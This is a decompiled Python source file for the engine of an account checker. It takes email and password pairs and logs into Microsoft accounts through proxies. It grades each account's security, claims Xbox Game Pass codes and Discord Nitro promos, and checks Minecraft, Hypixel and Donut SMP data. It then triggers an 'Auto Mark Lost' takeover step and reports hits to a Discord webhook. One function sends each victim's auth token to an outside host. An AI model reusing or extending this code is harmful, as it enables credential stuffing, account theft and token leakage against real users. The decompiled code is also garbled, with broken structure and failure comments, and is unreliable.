# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'src\\checker_engine.py'
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

"""\nChecker Engine - Quick Wins Update\nIntegrates: Improved Proxies, Simplified Results, Discord Webhook, Xbox Codes\n"""
import time
import requests
import threading
from typing import Dict, Optional, Callable
from src.auth.microsoft_oauth import MicrosoftAuthenticator
from src.auth.session_manager import get_session_manager
from src.checkers.security_checker import SecurityChecker
from src.checkers.minecraft_checker import MinecraftChecker
from src.checkers.xbox_checker import XboxChecker
from src.checkers.ms_rewards_checker import MSRewardsChecker
from src.checkers.nitro_checker import NitroChecker
from src.checkers.hypixel_checker import HypixelChecker
from src.checkers.donut_checker import DonutChecker
from src.checkers.xbox_codes import XboxCodesFetcher
from src.automation.auto_mark_lost import AutoMarkLost
from src.automation.notletters_pool import NotLettersPool
from src.storage.categorizer import SimplifiedCategorizer
from src.integrations.discord_webhook import DiscordWebhook
from src.network.proxy_manager import ProxyManager
from src.network.rate_limiter import get_rate_limiter
from src.utils.logger import get_logger
from src.utils.config_loader import ConfigLoader
logger = get_logger()
class CheckerEngine:
    # ***<module>.CheckerEngine: Failure detected at line number 83 and instruction offset 122: Different bytecode
    """Enhanced checker engine with Quick Wins features"""
    def __init__(self, config: ConfigLoader, progress_callback: Optional[Callable]=None):
        """\nInitialize checker engine\n\nArgs:\n    config: Configuration loader\n    progress_callback: Optional callback for progress updates\n"""
        # ***<module>.CheckerEngine.__init__: Failure: Compilation Error
        self.config = config
        self.progress_callback = progress_callback
        self.session_manager = get_session_manager()
        proxy_config = config.get_all().get('proxies', {})
        self.proxy_manager = ProxyManager(proxy_config)
        rate_limiting_config = config.get_all().get('rate_limiting', {})
        if rate_limiting_config.get('enabled', True):
            default_per_domain = {'api.minecraftservices.com': 5.0, 'user.auth.xboxlive.com': 3.0, 'xsts.auth.xboxlive.com': 3.0}
            config_per_domain = rate_limiting_config.get('per_domain', {})
            per_domain = {**default_per_domain, **config_per_domain}
            rate_limiter_config = {'global_delay': rate_limiting_config.get('global_delay', 0.5), 'per_domain': per_domain}
            self.rate_limiter = get_rate_limiter(rate_limiter_config)
            logger.info(f'✅ Rate limiter initialized: global_delay={rate_limiter_config['global_delay']}s, per_domain={rate_limiter_config['per_domain']}')
        else:
            self.rate_limiter = None
            logger.warning('⚠️ Rate limiting disabled in config')
        self.categorizer = SimplifiedCategorizer()
        discord_config = config.get_all().get('discord', {})
        self.discord = DiscordWebhook(discord_config)
        self.stats_lock = threading.Lock()
        self.notletters_pool = None
        automation_config = config.get_all().get('automation', {})
        if automation_config.get('auto_mark_lost', False) and automation_config.get('email_provider') == 'notletters':
                try:
                    email_file = automation_config.get('notletters_email_file', 'notletters_emails.txt')
                    self.notletters_pool = NotLettersPool(email_file)
                    logger.info('✅ NotLetters pool initialized')
                except Exception as e:
                    logger.error(f'Failed to initialize NotLetters pool: {e}')
                    self.notletters_pool = None
        self.stats = {'checked': 0, 'valid': 0, 'invalid': 0, 'errors': 0, 'hotmail_accounts': 0, 'outlook_accounts': 0, 'live_accounts': 0, 'gmail_accounts': 0, 'other_accounts': 0, 'minecraft_java_owned': 0, 'minecraft_bedrock_owned': 0, 'minecraft_both_owned': 0, 'gamepass_only': 0, 'no_minecraft': 0, 'clean_accounts': 0, '2fa_enabled': 0, 'security_pending': 0, 'has_xbox_gamertag': 0, 'nitro_claimed': 0, 'nitro_available': 0, 'nitro_not_eligible': 0, 'mark_lost_success': 0, 'mark_lost_failed': 0, 'mark_lost_skipped': 0, 'high_rewards': 0, 'hypixel_high_level': 0, 'hypixel_medium_level': 0, 'hypixel_ranked': 0, 'hypixel_banned': 0, 'donut_rich': 0, 'donut_active': 0, 'donut_banned': 0, '
    def check_account(self, email: str, password: str) -> Dict:
        # irreducible cflow, using cdg fallback
        """\nCheck a single account with all features\n\nArgs:\n    email: Email address\n    password: Password\n\nReturns:\n    Complete account data dictionary\n"""
        # ***<module>.CheckerEngine.check_account: Failure: Compilation Error
        account_data = {'email': email, 'password': password}
        logger.info(f'{'======================================================================'}')
        logger.info(f'Checking: {email}')
        logger.info(f'{'======================================================================'}')
        self._track_email_domain(email)
        proxy = self.proxy_manager.get_proxy(sticky_key=email)
        if proxy:
            logger.info('🌐 Using proxy')
        logger.info('🔐 Authenticating...')
        session = self.session_manager.get_session()
        authenticator = MicrosoftAuthenticator(session)
        if proxy:
            authenticator.session.proxies.update(proxy)
        rps_token = authenticator.authenticate(email, password)
        if not rps_token:
            logger.warning(f'❌ Authentication failed for {email}')
            account_data['error'] = 'Authentication failed'
            with self.stats_lock:
                self.stats['invalid'] += 1
            self.session_manager.clear_session()
            self.categorizer.save_result(account_data)
            return account_data
            logger.info('✅ Authentication successful')
            with self.stats_lock, self.stats['valid'] += 1:
                pass
            logger.info('🔍 Checking security status...')
            security_checker = SecurityChecker(self.session_manager.get_session())
            if proxy:
                security_checker.session.proxies.update(proxy)
            security_status = security_checker.check_security_info()
            account_data['security'] = security_status
            if security_status:
                status = security_status.get('status')
                logger.info(f'🔍 Security Status: {status}')
                with self.stats_lock:
                    if status == 'email_phone_only':
                        self.stats['clean_accounts'] += 1
                    else:
                        if status == '2fa_enabled':
                            self.stats['2fa_enabled'] += 1
                        else:
                            if status == 'pending_change':
                                self.stats['security_pending'] += 1
            logger.info('🎮 Getting Xbox tokens...')
            xbox_checker = XboxChecker(self.session_manager.get_session(), rate_limiter=self.rate_limiter)
            if proxy:
                xbox_checker.session.proxies.update(proxy)
            uhs, xsts_token = xbox_checker.get_xbox_tokens(rps_token)
            if not uhs or not xsts_token:
                logger.warning('⚠️ Failed to get Xbox tokens')
                account_data['xbox'] = {}
                account_data['minecraft'] = {}
                account_data['nitro'] = {}
                minecraft_data = None
                mc_token = None
                logger.info('🎮 Checking Minecraft...')
                minecraft_checker = MinecraftChecker(self.session_manager.get_session(), rate_limiter=self.rate_limiter)
                if proxy:
                    minecraft_checker.session.proxies.update(proxy)
                minecraft_data = self._check_minecraft_distributed(rps_token, proxy)
                if not minecraft_data:
                    logger.warning('⚠️ Distributed API failed, using local checker...')
                    minecraft_data = minecraft_checker.check_minecraft(rps_token)
                account_data['minecraft'] = minecraft_data
                mc_token = None
                if minecraft_data:
                    mc_token = minecraft_checker.get_minecraft_token(rps_token)
                    self._track_minecraft_stats(minecraft_data)
                if self.notletters_pool and minecraft_data:
                    ownership = minecraft_data.get('ownership', {})
                    if ownership.get('minecraft_java_owned'):
                        logger.info('🔄 Auto Mark Lost: Triggered for account with Java OWNED')
                            automation_config = self.config.get_all().get('automation', {})
                            auto_mark_lost = AutoMarkLost({'automation': automation_config}, self.notletters_pool)
                            result = auto_mark_lost.execute(email, password, minecraft_data)
                            account_data['mark_lost'] = result
                            with self.stats_lock:
                                if result.get('success'):
                                    self.stats['mark_lost_success'] += 1
                                else:
                                    self.stats['mark_lost_failed'] += 1
                        with self.stats_lock:
                            self.stats['mark_lost_skipped'] += 1
                                                        logger.info('🎮 Checking Xbox gamertag...')
                                                        gamertag = xbox_checker.get_gamertag(uhs, xsts_token)
                                                        if gamertag:
                                                            account_data['xbox'] = {'gamertag': gamertag}
                                                            logger.info(f'✅ Gamertag: {gamertag}')
                                                            with self.stats_lock:
                                                                self.stats['has_xbox_gamertag'] += 1
                                                        has_gamepass = False
                                                        has_gamepass_ultimate = False
                                                        has_gamepass_pc = False
                                                        if minecraft_data:
                                                            ownership = minecraft_data.get('ownership', {})
                                                            has_gamepass_pc = ownership.get('gamepass_pc', False)
                                                            has_gamepass_ultimate = ownership.get('gamepass_ultimate', False)
                                                            has_gamepass = has_gamepass_pc or has_gamepass_ultimate
                                                        if has_gamepass_ultimate:
                                                            logger.info('🎮 Game Pass Ultimate detected')
                                                        else:
                                                            if has_gamepass_pc:
                                                                logger.info('🎮 Game Pass PC detected')
                                                        checkers_config = self.config.get_all().get('checkers', {})
                                                        if checkers_config.get('fetch_xbox_codes', True) and has_gamepass:
                                                            gp_type = 'Ultimate' if has_gamepass_ultimate else 'PC'
                                                            logger.info(f'🎁 Fetching Xbox codes (Game Pass {gp_type} detected)...')
                                                            try:
                                                                codes_fetcher = XboxCodesFetcher(self.session_manager.get_session())
                                                                if proxy:
                                                                    codes_fetcher.session.proxies.update(proxy)
                                                                xbox_codes = codes_fetcher.fetch_codes(uhs, xsts_token)
                                                                if xbox_codes:
                                                                    account_data['xbox_codes'] = xbox_codes
                                                                    logger.info(f'🎁 Xbox Codes: {len(xbox_codes)} fetched')
                                                                    with self.stats_lock, self.stats['xbox_codes_fetched'] += len(xbox_codes):
                                                                        pass
                                                                    for code_info in xbox_codes:
                                                                        code = code_info.get('code')
                                                                        status = code_info.get('status', 'unknown')
                                                                        offer_id = code_info.get('offer_id', 'unknown')
                                                                        if status == 'claimed' and code and (code!= 'N/A'):
                                                                            self.categorizer.add_xbox_code(f'{code} (Claimed)', email)
                                                                        else:
                                                                            if status == 'available' and code and (code!= 'N/A'):
                                                                                self.categorizer.add_xbox_code(f'{code} (Available)', email)
                                                                            else:
                                                                                if status == 'available':
                                                                                    logger.warning(f'⚠️ Available code couldn\'t be claimed: {offer_id[:30]}...')
                                                                                    self.categorizer.add_xbox_code(f'Offer ID: {offer_id} (Available - claim failed)', email)
                                                            except Exception as e:
                                                                logger.error(f'Xbox codes fetch error: {e}')
                                                            else:
                                                                pass
                                                        else:
                                                            if checkers_config.get('fetch_xbox_codes', True):
                                                                logger.debug('⏭️ Skipping Xbox codes (no Game Pass detected)')
                                                                account_data['xbox_codes'] = []
                                                        if has_gamepass_ultimate:
                                                            logger.info('🎁 Checking Discord Nitro (Game Pass Ultimate detected)...')
                                                            nitro_checker = NitroChecker(self.session_manager.get_session())
                                                            if proxy:
                                                                nitro_checker.session.proxies.update(proxy)
                                                            nitro_data = nitro_checker.check_nitro(uhs, xsts_token)
                                                            account_data['nitro'] = nitro_data
                                                        else:
                                                            logger.debug('⏭️ Skipping Discord Nitro (no Game Pass Ultimate detected)')
                                                            nitro_data = {'eligible': False, 'status': 'not_eligible', 'redemption_link': None, 'promo_code': None, 'error': None}
                                                            account_data['nitro'] = nitro_data
                                                        if nitro_data:
                                                            with self.stats_lock:
                                                                if nitro_data.get('eligible'):
                                                                    if nitro_data.get('status') == 'claimed':
                                                                        self.stats['nitro_claimed'] += 1
                                                                        if nitro_data.get('promo_code'):
                                                                            logger.info(f'🎁 Nitro Promo Code: {nitro_data['promo_code']}')
                                                                    else:
                                                                        if nitro_data.get('status') == 'available':
                                                                            self.stats['nitro_available'] += 1
                                                                else:
                                                                    self.stats['nitro_not_eligible'] += 1
                    checkers_config = self.config.get_all().get('checkers', {})
                    if checkers_config.get('ms_rewards_enabled', False):
                        logger.info('💰 Checking MS Rewards...')
                        try:
                            rewards_checker = MSRewardsChecker(self.session_manager.get_session())
                            if proxy:
                                rewards_checker.session.proxies.update(proxy)
                            rewards_data = rewards_checker.check_rewards(email, password)
                            account_data['rewards'] = rewards_data
                            if rewards_data and rewards_data.get('available_points', 0) >= 500:
                                    with self.stats_lock, self.stats['high_rewards'] += 1:
                                        pass
                                    logger.info(f'💰 MS Rewards: {rewards_data.get('available_points')} points')
                        except Exception as e:
                            logger.error(f'MS Rewards check error: {e}')
                    if checkers_config.get('hypixel_enabled', True) and minecraft_data:
                        ownership = minecraft_data.get('ownership', {})
                        has_java_access = ownership.get('minecraft_java_owned') or ownership.get('minecraft_java_gamepass')
                        if has_java_access:
                            logger.info('⚔️ Checking Hypixel stats...')
                                hypixel_checker = HypixelChecker()
                                username = minecraft_data.get('profile', {}).get('username')
                                profile = minecraft_data.get('profile', {})
                                uuid = profile.get('uuid')
                                if username:
                                    hypixel_data = hypixel_checker.check_player(username)
                                    if checkers_config.get('hypixel_ban_check_enabled', True) and mc_token and uuid:
                                                logger.debug('🔍 Starting Hypixel ban check (non-blocking)...')
                                                import threading
                                                def ban_check_worker():
                                                    # irreducible cflow, using cdg fallback
                                                    # ***<module>.CheckerEngine.check_account.ban_check_worker: Failure: Compilation Error
                                                    ban_result = hypixel_checker.check_ban(username, mc_token, uuid)
                                                    if ban_result is not None:
                                                        hypixel_data['banned'] = ban_result
                                                        if ban_result!= 'False':
                                                            hypixel_data['ban_message'] = ban_result
                                                        else:
                                                            hypixel_data['ban_message'] = None
                                                            hypixel_data['banned'] = 'False'
                                                        logger.debug(f'✅ Hypixel ban check completed: {ban_result}')
                                                        logger.debug('⚠️ Hypixel ban check: No result (timeout or error)')
                                                            except Exception as e:
                                                                    logger.debug(f'Ban check error (non-fatal): {e}')
                                                ban_thread = threading.Thread(target=ban_check_worker, daemon=True)
                                                ban_thread.start()
                                                if 'ban_threads' not in account_data:
                                                    account_data['ban_threads'] = []
                                                account_data['ban_threads'].append(ban_thread)
                                    account_data['hypixel'] = hypixel_data
                                    if hypixel_data:
                                        level = hypixel_data.get('network_level', '0')
                                        rank = hypixel_data.get('rank')
                                            level_int = int(str(level).replace(',', ''))
                                            logger.info(f'✅ Hypixel: Level {level_int}')
                                            with self.stats_lock:
                                                if level_int >= 100:
                                                    self.stats['hypixel_high_level'] += 1
                                                else:
                                                    if level_int >= 50:
                                                        self.stats['hypixel_medium_level'] += 1
                                                        if rank and rank!= 'None':
                                                            with self.stats_lock, self.stats['hypixel_ranked'] += 1:
                                                                pass
                        if checkers_config.get('donut_enabled', True) and minecraft_data:
                            ownership = minecraft_data.get('ownership', {})
                            has_java_access = ownership.get('minecraft_java_owned') or ownership.get('minecraft_java_gamepass')
                            if has_java_access:
                                logger.info('🍩 Checking Donut SMP stats...')
                                    donut_checker = DonutChecker()
                                    username = minecraft_data.get('profile', {}).get('username')
                                    profile = minecraft_data.get('profile', {})
                                    uuid = profile.get('uuid')
                                    if username:
                                        donut_data = donut_checker.check_player(username)
                                        if checkers_config.get('donut_ban_check_enabled', True) and mc_token and uuid:
                                                    logger.debug('🔍 Starting DonutSMP ban check (non-blocking)...')
                                                    import threading
                                                    def ban_check_worker():
                                                        # irreducible cflow, using cdg fallback
                                                        # ***<module>.CheckerEngine.check_account.ban_check_worker: Failure: Compilation Error
                                                        ban_result = donut_checker.check_ban(username, mc_token, uuid)
                                                        if ban_result is not None:
                                                            donut_data['banned'] = ban_result
                                                            if ban_result!= 'False':
                                                                donut_data['ban_message'] = ban_result
                                                            else:
                                                                donut_data['ban_message'] = None
                                                                donut_data['banned'] = 'False'
                                                            logger.debug(f'✅ DonutSMP ban check completed: {ban_result}')
                                                            logger.debug('⚠️ DonutSMP ban check: No result (timeout or error)')
                                                                except Exception as e:
                                                                        logger.debug(f'Donut ban check error (non-fatal): {e}')
                                                    ban_thread = threading.Thread(target=ban_check_worker, daemon=True)
                                                    ban_thread.start()
                                                    if 'ban_threads' not in account_data:
                                                        account_data['ban_threads'] = []
                                                    account_data['ban_threads'].append(ban_thread)
                                        account_data['donut'] = donut_data
                                        if donut_data:
                                            balance = donut_data.get('money', '0')
                                            playtime = donut_data.get('playtime_hours', 0)
                                            logger.info(f'✅ Donut SMP: {balance}, {playtime}h')
                                            with self.stats_lock:
                                                try:
                                                    balance_int = int(balance.replace('$', '').replace(',', ''))
                                                    if balance_int >= 10000:
                                                        self.stats['donut_rich'] += 1
                                                except:
                                                    pass
                                                if playtime >= 10:
                                                    self.stats['donut_active'] += 1
                            self.session_manager.clear_session()
                            with self.stats_lock:
                                self.stats['checked'] += 1
                            logger.info('✅ Account check complete')
                            if 'ban_threads' in account_data:
                                import time
                                for ban_thread in account_data['ban_threads']:
                                    ban_thread.join(timeout=5)
                                del account_data['ban_threads']
                                time.sleep(0.3)
                                hypixel_data = account_data.get('hypixel', {})
                                if hypixel_data:
                                    banned = hypixel_data.get('banned', False)
                                    if banned and str(banned).lower()!= 'false':
                                            with self.stats_lock, self.stats['hypixel_banned'] += 1:
                                                pass
                                            logger.warning(f'⚠️ Hypixel: BANNED - {banned}')
                                donut_data = account_data.get('donut', {})
                                if donut_data:
                                    banned = donut_data.get('banned', False)
                                    if banned and str(banned).lower()!= 'false':
                                            with self.stats_lock, self.stats['donut_banned'] += 1:
                                                pass
                                            logger.warning(f'⚠️ Donut SMP: BANNED - {banned}')
                            try:
                                self.categorizer.save_result(account_data)
                                logger.info('💾 Result saved')
                            except Exception as e:
                                logger.error(f'Failed to save result: {e}')
                                self.discord.send_hit(account_data)
                                    return account_data
                                except Exception as e:
                                        logger.error(f'Auto Mark Lost error: {e}')
                                        with self.stats_lock:
                                            self.stats['mark_lost_failed'] += 1
                                                logger.info(f'✅ Hypixel: Level {level}')
                                    except Exception as e:
                                            logger.error(f'Hypixel check error: {e}')
                                        except Exception as e:
                                                logger.error(f'Donut SMP check error: {e}')
                                    except Exception as e:
                                            logger.error(f'Discord webhook error: {e}')
            except Exception as e:
                    logger.error(f'Check failed for {email}: {e}', exc_info=True)
                    account_data['error'] = str(e)
                    with self.stats_lock:
                        self.stats['errors'] += 1
                    self.session_manager.clear_session()
                    try:
                        self.categorizer.save_result(account_data)
                    else:
                        pass
    def _track_email_domain(self, email: str):
        """Track email domain statistics"""
        email_lower = email.lower()
        with self.stats_lock:
            if '@hotmail.' in email_lower:
                self.stats['hotmail_accounts'] += 1
            else:
                if '@outlook.' in email_lower:
                    self.stats['outlook_accounts'] += 1
                else:
                    if '@live.' in email_lower:
                        self.stats['live_accounts'] += 1
                    else:
                        if '@gmail.' in email_lower:
                            self.stats['gmail_accounts'] += 1
                        else:
                            self.stats['other_accounts'] += 1
    def _track_minecraft_stats(self, minecraft_data: Dict):
        """Track Minecraft ownership statistics"""
        ownership = minecraft_data.get('ownership', {})
        java_owned = ownership.get('minecraft_java_owned', False)
        bedrock_owned = ownership.get('minecraft_bedrock_owned', False)
        java_gamepass = ownership.get('minecraft_java_gamepass', False)
        bedrock_gamepass = ownership.get('minecraft_bedrock_gamepass', False)
        with self.stats_lock:
            if java_owned and bedrock_owned:
                self.stats['minecraft_both_owned'] += 1
            else:
                if java_owned:
                    self.stats['minecraft_java_owned'] += 1
                else:
                    if bedrock_owned:
                        self.stats['minecraft_bedrock_owned'] += 1
                    else:
                        if java_gamepass or bedrock_gamepass:
                            self.stats['gamepass_only'] += 1
                        else:
                            self.stats['no_minecraft'] += 1
    def get_stats(self) -> Dict:
        """Get current statistics"""
        return self.stats.copy()
    def reset_stats(self):
        """Reset statistics"""
        # ***<module>.CheckerEngine.reset_stats: Failure: Compilation Error
        for key in self.stats:
            self.stats[key] = 0
    def _check_minecraft_distributed(self, rps_token, proxy=None):
        # irreducible cflow, using cdg fallback
        """\nUse distributed API for complete Minecraft checking\nWorkers handle both ownership AND profile\n"""
        # ***<module>.CheckerEngine._check_minecraft_distributed: Failure: Different control flow
        ROUTER_URL = 'http://fi8.bot-hosting.net:20048'
        logger.info('🌐 Attempting distributed Minecraft check...')
        response = requests.post(f'{ROUTER_URL}/check_minecraft', json={'rps_token': rps_token}, timeout=60)
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                logger.info('✅ Distributed check successful!')
                ownership = data.get('ownership', {})
                logger.info(f'✅ Ownership checked: Java={ownership.get('minecraft_java_owned')}, Bedrock={ownership.get('minecraft_bedrock_owned')}')
                profile = data.get('profile', {})
                if profile and profile.get('username'):
                        logger.info(f'✅ Profile retrieved: {profile.get('username')}')
                return {'ownership': ownership, 'profile': profile}
                logger.warning(f'⚠️ Distributed API returned error: {response.status_code}')
                    return
                    except requests.exceptions.Timeout:
                        logger.warning('⚠️ Distributed API timeout')
                            return
                        except requests.exceptions.ConnectionError:
                            logger.warning('⚠️ Distributed API unavailable')
                                return
                            except Exception as e:
                                    logger.warning(f'⚠️ Distributed API error: {e}')
                                        return None